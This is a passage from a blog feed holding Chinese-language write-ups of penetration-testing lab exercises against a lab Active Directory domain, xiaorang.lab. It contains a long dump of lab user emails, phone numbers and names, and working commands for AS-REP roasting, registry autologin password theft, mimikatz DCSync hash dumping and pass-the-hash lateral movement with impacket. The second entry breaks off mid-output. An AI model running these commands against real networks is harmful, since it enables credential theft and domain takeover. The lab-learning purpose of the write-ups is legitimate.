class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line">id  | email                      | phone       | username        |</span><br><span class="line">+-----+----------------------------+-------------+-----------------+</span><br><span class="line">[16:34:10] [WARNING] console output will be trimmed to last 256 rows due to large table size</span><br><span class="line">| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        |</span><br><span class="line">| 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        |</span><br><span class="line">| 247 | buning@xiaorang.lab        | 13046481392 | BU NING         |</span><br><span class="line">| 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         |</span><br><span class="line">| 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         |</span><br><span class="line">| 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           |</span><br><span class="line">| 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      |</span><br><span class="line">| 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        |</span><br><span class="line">| 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       |</span><br><span class="line">| 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          |</span><br><span class="line">| 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         |</span><br><span class="line">| 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          |</span><br><span class="line">| 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           |</span><br><span class="line">| 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    |</span><br><span class="line">| 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         |</span><br><span class="line">| 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         |</span><br><span class="line">| 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         |</span><br><span class="line">| 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         |</span><br><span class="line">| 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         |</span><br><span class="line">| 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       |</span><br><span class="line">| 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         |</span><br><span class="line">| 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          |</span><br><span class="line">| 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        |</span><br><span class="line">| 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  |</span><br><span class="line">| 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       |</span><br><span class="line">| 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        |</span><br><span class="line">| 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       |</span><br><span class="line">| 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       |</span><br><span class="line">| 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          |</span><br><span class="line">| 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        |</span><br><span class="line">| 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       |</span><br><span class="line">| 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        |</span><br><span class="line">| 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        |</span><br><span class="line">| 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     |</span><br><span class="line">| 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         |</span><br><span class="line">| 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     |</span><br><span class="line">| 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        |</span><br><span class="line">| 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         |</span><br><span class="line">| 283 | maoda@xiaorang.lab         | 13878840690 | MAO DA          |</span><br><span class="line">| 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        |</span><br><span class="line">| 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       |</span><br><span class="line">| 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        |</span><br><span class="line">| 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         |</span><br><span class="line">| 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          |</span><br><span class="line">| 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     |</span><br><span class="line">| 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          |</span><br><span class="line">| 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         |</span><br><span class="line">| 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       |</span><br><span class="line">| 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          |</span><br><span class="line">| 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           |</span><br><span class="line">| 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     |</span><br><span class="line">| 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        |</span><br><span class="line">| 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       |</span><br><span class="line">| 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        |</span><br><span class="line">| 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       |</span><br><span class="line">| 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       |</span><br><span class="line">| 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         |</span><br><span class="line">| 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          |</span><br><span class="line">| 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        |</span><br><span class="line">| 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        |</span><br><span class="line">| 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          |</span><br><span class="line">| 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      |</span><br><span class="line">| 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         |</span><br><span class="line">| 308 | didi@xiaorang.lab          | 13413041463 | DI DI           |</span><br><span class="line">| 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         |</span><br><span class="line">| 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       |</span><br><span class="line">| 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        |</span><br><span class="line">| 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          |</span><br><span class="line">| 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     |</span><br><span class="line">| 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     |</span><br><span class="line">| 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        |</span><br><span class="line">| 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       |</span><br><span class="line">| 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        |</span><br><span class="line">| 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        |</span><br><span class="line">| 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          |</span><br><span class="line">| 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           |</span><br><span class="line">| 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         |</span><br><span class="line">| 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       |</span><br><span class="line">| 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         |</span><br><span class="line">| 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        |</span><br><span class="line">| 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         |</span><br><span class="line">| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |</span><br><span class="line">| 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        |</span><br><span class="line">| 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         |</span><br><span class="line">| 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          |</span><br><span class="line">| 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    |</span><br><span class="line">| 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    |</span><br><span class="line">| 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          |</span><br><span class="line">| 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         |</span><br><span class="line">| 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         |</span><br><span class="line">| 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          |</span><br><span class="line">| 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       |</span><br><span class="line">| 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      |</span><br><span class="line">| 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          |</span><br><span class="line">| 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          |</span><br><span class="line">| 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       |</span><br><span class="line">| 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         |</span><br><span class="line">| 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         |</span><br><span class="line">| 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      |</span><br><span class="line">| 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          |</span><br><span class="line">| 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       |</span><br><span class="line">| 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        |</span><br><span class="line">| 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         |</span><br><span class="line">| 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         |</span><br><span class="line">| 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          |</span><br><span class="line">| 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          |</span><br><span class="line">| 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        |</span><br><span class="line">| 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       |</span><br><span class="line">| 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       |</span><br><span class="line">| 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        |</span><br><span class="line">| 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      |</span><br><span class="line">| 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         |</span><br><span class="line">| 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        |</span><br><span class="line">| 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      |</span><br><span class="line">| 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       |</span><br><span class="line">| 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        |</span><br><span class="line">| 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         |</span><br><span class="line">| 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        |</span><br><span class="line">| 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           |</span><br><span class="line">| 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           |</span><br><span class="line">| 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          |</span><br><span class="line">| 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      |</span><br><span class="line">| 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       |</span><br><span class="line">| 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         |</span><br><span class="line">| 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         |</span><br><span class="line">| 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         |</span><br><span class="line">| 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         |</span><br><span class="line">| 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         |</span><br><span class="line">| 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        |</span><br><span class="line">| 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        |</span><br><span class="line">| 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        |</span><br><span class="line">| 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     |</span><br><span class="line">| 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     |</span><br><span class="line">| 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        |</span><br><span class="line">| 379 | heli@xiaorang.lab          | 13701347081 | HE LI           |</span><br><span class="line">| 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        |</span><br><span class="line">| 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          |</span><br><span class="line">| 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       |</span><br><span class="line">| 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       |</span><br><span class="line">| 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          |</span><br><span class="line">| 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          |</span><br><span class="line">| 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       |</span><br><span class="line">| 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           |</span><br><span class="line">| 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         |</span><br><span class="line">| 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        |</span><br><span class="line">| 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         |</span><br><span class="line">| 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    |</span><br><span class="line">| 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         |</span><br><span class="line">| 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        |</span><br><span class="line">| 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          |</span><br><span class="line">| 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          |</span><br><span class="line">| 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     |</span><br><span class="line">| 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        |</span><br><span class="line">| 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          |</span><br><span class="line">| 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          |</span><br><span class="line">| 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       |</span><br><span class="line">| 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        |</span><br><span class="line">| 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       |</span><br><span class="line">| 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          |</span><br><span class="line">| 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       |</span><br><span class="line">| 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        |</span><br><span class="line">| 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        |</span><br><span class="line">| 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         |</span><br><span class="line">| 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       |</span><br><span class="line">| 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        |</span><br><span class="line">| 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        |</span><br><span class="line">| 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         |</span><br><span class="line">| 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       |</span><br><span class="line">| 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         |</span><br><span class="line">| 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          |</span><br><span class="line">| 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       |</span><br><span class="line">| 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       |</span><br><span class="line">| 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          |</span><br><span class="line">| 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         |</span><br><span class="line">| 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         |</span><br><span class="line">| 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         |</span><br><span class="line">| 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       |</span><br><span class="line">| 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   |</span><br><span class="line">| 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         |</span><br><span class="line">| 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         |</span><br><span class="line">| 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          |</span><br><span class="line">| 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          |</span><br><span class="line">| 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        |</span><br><span class="line">| 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    |</span><br><span class="line">| 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        |</span><br><span class="line">| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |</span><br><span class="line">| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |</span><br><span class="line">| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |</span><br><span class="line">| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |</span><br><span class="line">| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |</span><br><span class="line">| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |</span><br><span class="line">| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |</span><br><span class="line">| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |</span><br><span class="line">| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |</span><br><span class="line">| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |</span><br><span class="line">| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |</span><br><span class="line">| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |</span><br><span class="line">| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |</span><br><span class="line">| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |</span><br><span class="line">| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |</span><br><span class="line">| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |</span><br><span class="line">| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |</span><br><span class="line">| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |</span><br><span class="line">| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |</span><br><span class="line">| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |</span><br><span class="line">| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |</span><br><span class="line">| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |</span><br><span class="line">| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |</span><br><span class="line">| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |</span><br><span class="line">| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |</span><br><span class="line">| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |</span><br><span class="line">| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |</span><br><span class="line">| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |</span><br><span class="line">| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |</span><br><span class="line">| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |</span><br><span class="line">| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |</span><br><span class="line">| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |</span><br><span class="line">| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |</span><br><span class="line">| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |</span><br><span class="line">| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |</span><br><span class="line">| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |</span><br><span class="line">| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |</span><br><span class="line">| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |</span><br><span class="line">| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |</span><br><span class="line">| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |</span><br><span class="line">| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |</span><br><span class="line">| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |</span><br><span class="line">| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |</span><br><span class="line">| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |</span><br><span class="line">| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |</span><br><span class="line">| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |</span><br><span class="line">| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |</span><br><span class="line">| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |</span><br><span class="line">| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |</span><br><span class="line">| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |</span><br><span class="line">| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |</span><br><span class="line">| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |</span><br><span class="line">| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |</span><br><span class="line">| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |</span><br><span class="line">| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |</span><br><span class="line">| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |</span><br><span class="line">| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |</span><br><span class="line">| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |</span><br><span class="line">| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |</span><br><span class="line">| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |</span><br><span class="line">| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |</span><br><span class="line">| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |</span><br><span class="line">| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |</span><br><span class="line">| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |</span><br><span class="line">| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |</span><br><span class="line">| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |</span><br><span class="line">| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |</span><br><span class="line">| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |</span><br><span class="line">| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |</span><br><span class="line">| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |</span><br><span class="line">| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |</span><br><span class="line">+-----+----------------------------+-------------+-----------------+</span><br></pre></td></tr></table></figure><p>还有一堆邮箱手机号和用户名，先吧邮箱前面的用户给提取出来。</p><h3 id="AS-REP-Roasting">AS-REP Roasting</h3><p>域内枚举下账号，因为有可能会有被设置关闭了预身份验证，这样就能爆破该账户的密码了</p><p><code>proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</code></p><img src="/post/28f71a4e/IMAGE20250308164907682.png" class=""><p>用john爆破下密码</p><img src="/post/28f71a4e/IMAGE20250308165217971.png" class=""><p>得到密码，看看能不能rdp一下，172.22.6.25能够登录上去</p><img src="/post/28f71a4e/IMAGE20250308165606189.png" class=""><h3 id="autologin">autologin</h3><p>还有一个用户也在登录着。先用bloodhound收集下域内的信息</p><img src="/post/28f71a4e/IMAGE20250308165849733.png" class=""><p>HasSession：用户与计算机时进行会话时，凭据会保留在内存中，说明yuxuan这个用户登录过WIN2019，很多用户习惯将计算机设置自动登录。（这里是参考的其他师傅的文章）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></pre></td></tr></table></figure><p>抓一下密码或者用msf也行记录下</p><p><code>run windows/gather/credentials/windows_autologin</code></p><img src="/post/28f71a4e/IMAGE20250308170123548.png" class=""><p>抓到密码<code>Yuxuan7QbrgZ3L</code>之后切换下用户登录。</p><h3 id="SID历史功能滥用">SID历史功能滥用</h3><p>在上面的图中可以看到这个用户是有HasSIDHistory：用户的SID历史记录，用户在域迁移后，票据还包含着前域所在组的SID，虽然用户不属于前域，但仍拥有前域的权限。</p><p>那么就简单了就上传下mimkatz抓一下hash然后横向就完了</p><p><code>mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</code></p><img src="/post/28f71a4e/IMAGE20250308170650085.png" class=""><p>打pth使用impacket</p><p><code>proxychains python3 smbexec.py -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 administrator@172.22.6.12</code></p><img src="/post/28f71a4e/IMAGE20250308171110027.png" class=""><p>还有一个flag在另一台机器上继续横过去就行了，使用wmi横</p><p><code>proxychains python3 wmiexec.py XIAORANG/administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</code></p><img src="/post/28f71a4e/IMAGE20250308171506447.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;还是用fscan 扫描下收集下端口&lt;/p&gt;
&lt;img src=&quot;/post/28f71a4e/IMAGE20250308155713899.png&quot; class=&quot;&quot;&gt;
&lt;p&gt;发现开放了 7687端口，存在一个nday&lt;br&gt;</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Tsclient</title>
    <link href="https://oceanzbz.github.io/post/72d64c19.html"/>
    <id>https://oceanzbz.github.io/post/72d64c19.html</id>
    <published>2025-03-07T10:56:26.000Z</published>
    <updated>2025-03-08T09:18:07.488Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>先用fscan扫描一下看看有啥东西吗</p><img src="/post/72d64c19/IMAGE20250307185902774.png" class=""><h2 id="数据库提权">数据库提权</h2><p>扫描出来一个弱口令，我们用mdut登录下看看能不能提权</p><img src="/post/72d64c19/IMAGE20250307190119315.png" class=""><p>发现可以执行xpcmd</p><img src="/post/72d64c19/IMAGE20250307190202755.png" class=""><p>但是是mssql权限，考虑用哥甜土豆提权一下看看能不能成功</p><img src="/post/72d64c19/IMAGE20250307190527289.png" class=""><p>发现可以提权成功。来反弹个shell，这里学习下cs工具的使用</p><img src="/post/72d64c19/IMAGE20250307190726127.png" class=""><p>上线成功，来读取一波flag</p><img src="/post/72d64c19/IMAGE20250307191113711.png" class=""><h2 id="内网渗透">内网渗透</h2><p>收集下内网信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     